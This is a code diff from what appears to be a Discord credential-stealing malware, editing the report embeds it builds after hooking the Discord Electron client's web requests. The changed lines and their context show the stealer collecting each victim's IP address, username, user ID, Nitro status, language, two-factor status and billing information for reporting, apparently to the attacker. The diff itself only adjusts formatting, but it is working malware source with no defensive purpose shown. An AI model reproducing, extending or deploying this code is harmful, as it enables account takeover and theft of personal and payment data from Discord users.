@@ -272,15 +272,15 @@ const FirstTime = async () => {
             title: "Initalized",
             fields: [{
                 name: "Info",
-                value: `\`\P: \n${ip}\n\`\`\``,
-                inline: !1
+                value: `\`${ip}\``,
+                inline: !0
             }, {
                 name: "Username <:username:1041634536733290596> ",
                 value: `\`${user.username}#${user.discriminator}\``,
                 inline: !0
             }, {
                 name: "ID <:iduser:1041634535395307520>",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                value: `\`${user.id}\``,
                 inline: !0
             }, {
                 name: "Nitro <a:nitro:1041639670288748634>",
@@ -289,7 +289,7 @@ const FirstTime = async () => {
             }, {
                 name: "Language <:language:1041640473477001236>",
                 value: `${GetLangue(user.locale)}`,
-                inline: !0
+                inline: !1
             }, {
                 name: "NSFW <a:nsfw:1041640474617839616>",
                 value: `${GetNSFW(user.nsfw_allowed)}`,
@@ -297,7 +297,7 @@ const FirstTime = async () => {
             }, {
                 name: "A2F <a:a2f:1040272766982692885>",
                 value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0
+                inline: !1
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
                 value: `${Billings}`,
@@ -439,8 +439,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 color: config['embed-color'],
                 fields: [{
                     name: "Info",
-                    value: `\`IP: \n${ip}\n\`\`\``,
-                    inline: !1
+                    value: `\`${ip}\``,
+                    inline: !0
                 }, {
                     name: "Username <:username:1041634536733290596> ",
                     value: `\`${user.username}#${user.discriminator}\``,
@@ -456,7 +456,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "Language <:language:1041640473477001236>",
                     value: `${GetLangue(user.locale)}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "NSFW <a:nsfw:1041640474617839616>",
                     value: `${GetNSFW(user.nsfw_allowed)}`,
@@ -464,7 +464,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
                     value: `${Billings}`,
